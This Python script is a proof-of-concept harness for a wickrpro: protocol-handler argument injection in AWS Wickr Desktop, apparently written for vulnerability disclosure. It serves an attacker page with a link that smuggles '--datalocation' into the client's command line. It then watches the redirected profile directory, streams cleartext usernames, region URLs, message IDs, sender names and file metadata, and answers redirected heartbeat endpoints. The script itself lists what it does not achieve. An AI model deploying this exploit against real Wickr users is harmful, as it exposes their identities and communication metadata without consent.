#!/usr/bin/env python3
"""
AWS Wickr Desktop 6.72.20.0 (Windows) — W37 / W37b reproduction harness
=======================================================================

Reproduces, in one process:

  1. DELIVERY   — serves /index.html, the attacker page whose link injects
                  command-line options into WickrPro.exe through the
                  `wickrpro:` protocol handler (CWE-88).
  2. EXPOSURE   — watches the attacker-named data directory that the injected
                  `--datalocation` makes the client use, and streams the
                  cleartext it finds there (CWE-532).
  3. NETWORK    — answers the endpoints the client hits when `regionBaseURL`
                  is planted, so the (weak) network half is visible too.

HONEST SCOPE — what this does NOT show, because it was measured NOT to happen:
  * No code execution. No Chromium switch reaches QtWebEngine at all
    (initCommandLine drops app argv without a `--webEngineArgs` separator).
  * No credential capture. Authentication resolves its own region via
    WickrMultiRegionRequest() and goes to the REAL backend; a login attempt
    produces ZERO requests here.
  * No message bodies, no attachment plaintext, no key material. The DB and
    temp/attachments are encrypted (entropy 7.91-7.9994 b/B); `text`,
    `textContent` and `downloadUrl` are logged as KEYS ONLY, never with values.
  * The planted `regionBaseURL` is OVERWRITTEN by the client's own region
    discovery, and the heartbeats it redirects here are EMPTY (53 bytes).

What IS reproducible is metadata + identity disclosure into an attacker-named
directory. Run it, click the link, log in, use the client normally.

Usage:
    python repro_server.py [--port 8099] [--dir C:\\path\\to\\attacker\\dir]

Preconditions (all measured; the chain silently fails without them):
    * WickrPro.exe must NOT already be running — a running instance makes the
      shell suppress the new process entirely, so the injected argv never
      materialises.
    * The victim must accept the browser's external-protocol dialog.
    * `--datalocation` requires the target directory to already exist (this
      script creates it).
"""

import argparse
import html
import json
import os
import re
import socket
import sys
import threading
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# --------------------------------------------------------------------------
# output
# --------------------------------------------------------------------------

LOCK = threading.Lock()
LOGFILE = None


def emit(tag, msg):
    line = f"[{datetime.now():%H:%M:%S}] {tag:<11} {msg}"
    with LOCK:
        print(line, flush=True)
        if LOGFILE:
            with open(LOGFILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")


BANNER = r"""
================================================================================
 AWS Wickr Desktop  -  wickrpro:// argument injection  (W37 / W37b)
   CWE-88  argument injection via URL protocol handler
   CWE-532 sensitive information written to an attacker-named directory
 NOT remote code execution. NOT credential theft. NOT message content.
================================================================================
"""

# attachment filenames in the exposed logs may be non-ASCII (e.g. Japanese);
# a cp932/cp1252 console would otherwise abort the whole harness on the first one
for _s in (sys.stdout, sys.stderr):
    try:
        _s.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

# --------------------------------------------------------------------------
# 1. delivery page
# --------------------------------------------------------------------------

PAGE = """<!doctype html>
<meta charset="utf-8">
<title>W37 — wickrpro:// argument injection repro</title>
<style>
 body{{font:15px/1.6 system-ui,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;
      background:#10131a;color:#e6e9ef}}
 code,pre{{background:#171b24;border:1px solid #262c3a;border-radius:6px}}
 code{{padding:2px 6px}}
 pre{{padding:14px;overflow-x:auto;white-space:pre-wrap;word-break:break-all;font-size:13px}}
 a.fire{{display:inline-block;margin:14px 0;padding:12px 20px;background:#7a1020;color:#fff;
        border-radius:8px;text-decoration:none;font-weight:700}}
 .note{{border-left:3px solid #c8a020;padding:8px 14px;margin:18px 0;color:#d8d2bd}}
 h1{{font-size:20px}} h2{{font-size:15px;color:#8fa0bd;text-transform:uppercase;
     letter-spacing:.06em;margin-top:28px}}
</style>

<h1>W37 — <code>wickrpro://</code> argument injection, reproduction</h1>

<p>The handler is registered as
<code>"…\\WickrPro.exe" "%1"</code>. <code>%1</code> is substituted <em>literally</em> into a
command line that Windows then re-splits with <code>CommandLineToArgvW</code>, so any token in
the URL becomes a separate <code>argv</code> element. The opaque-path URL form
(<code>wickrpro:</code> with no <code>//</code>) survives the browser's URL serialisation with
quotes and spaces intact.</p>

<h2>Preconditions</h2>
<div class="note">
<b>Wickr must not already be running.</b> With a live instance the shell suppresses the new
process entirely and nothing is injected.<br>
The browser will show an external-protocol confirmation — it must be accepted.<br>
After launch the client shows a <b>blank profile</b>; a login is required for the metadata to
start flowing.
</div>

<h2>Payload</h2>
<pre>{url_display}</pre>
<a class="fire" href="{url_attr}">Fire the protocol handler</a>

<h2>What the harness will print</h2>
<p>The injected <code>--datalocation</code> makes the client keep its profile in
<code>{datadir_display}</code>, which this harness is watching. Settings and logs there are
plaintext; the message database and <code>temp/attachments</code> are encrypted.</p>

<h2>Measured negatives — do not claim these</h2>
<pre>no code execution      - no Chromium switch reaches QtWebEngine in any prefix form
no credential capture  - auth uses WickrMultiRegionRequest() -> the REAL backend
no message bodies      - "text"/"textContent" are logged as keys with no value
no attachment content  - temp/attachments entropy 7.91-7.9994 bits/byte
no download URLs       - "downloadUrl" is a key only; nothing is pre-signed</pre>
"""


def build_url(datadir):
    # opaque-path form; the quote closes the shell's "%1" so the rest becomes argv
    return 'wickrpro:x" --datalocation ' + datadir


# --------------------------------------------------------------------------
# 2. exposure watcher — what a WebDAV-hosted directory would hand the attacker
# --------------------------------------------------------------------------

SETTINGS_KEYS = [
    "last_successful_user", "last_attempted_user", "regionName", "regionBaseURL",
    "certPinningEnabled", "userMetricsID", "deviceMetricsID", "forceDeviceLockout",
    "failedLoginAttempts", "userVerificationFlow", "first_login", "downloads",
]

# fields proven to appear with real values in the plaintext [JS] bridge dumps
INTERESTING = re.compile(
    r'"(vGroupID|vgroupId|msgId|serverMessageId|senderUserName|senderHash|targetUsers|'
    r'name|mimetype|size|fileHash|guid|location|destructTime|ttl|timeStamp)"'
    r'\s*:\s*("(?:[^"\\]|\\.)*"|\d+|\[[^\]]*\])'
)


def watch_settings(datadir, stop):
    seen = {}
    while not stop.is_set():
        for root, _, files in os.walk(datadir):
            if "settings" in files:
                p = os.path.join(root, "settings")
                try:
                    mt = os.path.getmtime(p)
                    if seen.get(p) == mt:
                        continue
                    seen[p] = mt
                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        body = f.read()
                except OSError:
                    continue
                emit("SETTINGS", f"{os.path.relpath(p, datadir)} changed — cleartext values:")
                for k in SETTINGS_KEYS:
                    m = re.search(rf"(?m)^{re.escape(k)}=(.*)$", body)
                    if m:
                        emit("SETTINGS", f"    {k} = {m.group(1).strip()}")
        stop.wait(2)


def watch_logs(datadir, stop):
    """Tail every app log under the directory and surface the metadata fields."""
    offsets = {}
    while not stop.is_set():
        for root, _, files in os.walk(datadir):
            if os.path.basename(root) != "logs":
                continue
            for fn in files:
                if not fn.endswith(".txt") or "_npl" in fn:
                    continue
                p = os.path.join(root, fn)
                try:
                    size = os.path.getsize(p)
                    off = offsets.get(p, 0)
                    if size < off:            # rotated / truncated
                        off = 0
                    if size == off:
                        continue
                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        f.seek(off)
                        chunk = f.read()
                        offsets[p] = f.tell()
                except OSError:
                    continue
                for line in chunk.splitlines():
                    hits = INTERESTING.findall(line)
                    if not hits:
                        continue
                    fields = {}
                    for k, v in hits:
                        try:
                            fields[k] = json.loads(v)
                        except Exception:
                            fields[k] = v.strip('"')
                    # drop the empty ones so the stream stays readable
                    fields = {k: v for k, v in fields.items()
                              if v not in ("", None, [], 0)}
                    if fields:
                        emit("METADATA", json.dumps(fields, ensure_ascii=False))
        stop.wait(1)


# --------------------------------------------------------------------------
# 3. network half
# --------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "W37Repro/1.0"
    url_display = ""
    url_attr = ""
    datadir = ""

    def _send(self, body, ctype="text/html; charset=utf-8", code=200):
        if isinstance(body, str):
            body = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = self.path.split("?", 1)[0]
        if path in ("/", "/index.html"):
            emit("PAGE", f"served {path} to {self.client_address[0]}")
            self._send(PAGE.format(
                url_display=html.escape(self.url_display),
                url_attr=html.escape(self.url_attr, quote=True),
                datadir_display=html.escape(self.datadir)))
        else:
            emit("HTTP", f"GET {self.path}")
            self._send(json.dumps({"status": 200, "result": "success"}),
                       "application/json")

    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n) if n else b""
        emit("HTTP", f"POST {self.path}  ({len(raw)} bytes)")
        if raw and len(raw) < 4096:
            txt = raw.decode("utf-8", "replace").strip()
            if txt and not txt.startswith("--boundary"):
                emit("HTTP", f"    body: {txt[:800]}")
            else:
                emit("HTTP", "    body: (empty multipart — heartbeats carry nothing)")
        self._send(json.dumps({"status": 200, "result": "success"}),
                   "application/json")

    def log_message(self, *a):
        pass


# --------------------------------------------------------------------------

def main():
    global LOGFILE
    here = os.path.dirname(os.path.abspath(__file__))
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8099)
    ap.add_argument("--dir", default=os.path.join(here, "wickr_exfil"),
                    help="attacker-named directory the injected --datalocation points at "
                         "(must contain no spaces)")
    ap.add_argument("--log", default=os.path.join(here, "repro.log"))
    args = ap.parse_args()

    datadir = os.path.abspath(args.dir)
    if " " in datadir:
        sys.exit("error: --dir must not contain spaces (the shell re-splits argv on them)")
    os.makedirs(datadir, exist_ok=True)
    LOGFILE = args.log

    url = build_url(datadir)
    Handler.url_display = url
    Handler.url_attr = url
    Handler.datadir = datadir

    print(BANNER)
    emit("READY", f"page       http://0.0.0.0:{args.port}/index.html")
    # show the LAN IP the victim would actually click from
    try:
        lan = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        lan.connect(("8.8.8.8", 80))
        lan_ip = lan.getsockname()[0]
        lan.close()
    except OSError:
        lan_ip = "<lan-ip>"
    emit("READY", f"clickable  http://{lan_ip}:{args.port}/index.html")
    emit("READY", f"watching   {datadir}")
    emit("READY", f"payload    {url}")
    emit("READY", "close Wickr first, then click the link, then log in")

    stop = threading.Event()
    for fn in (watch_settings, watch_logs):
        threading.Thread(target=fn, args=(datadir, stop), daemon=True).start()

    srv = ThreadingHTTPServer(("0.0.0.0", args.port), Handler)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        emit("EXIT", "stopping")
        stop.set()
        srv.shutdown()


if __name__ == "__main__":
    main()
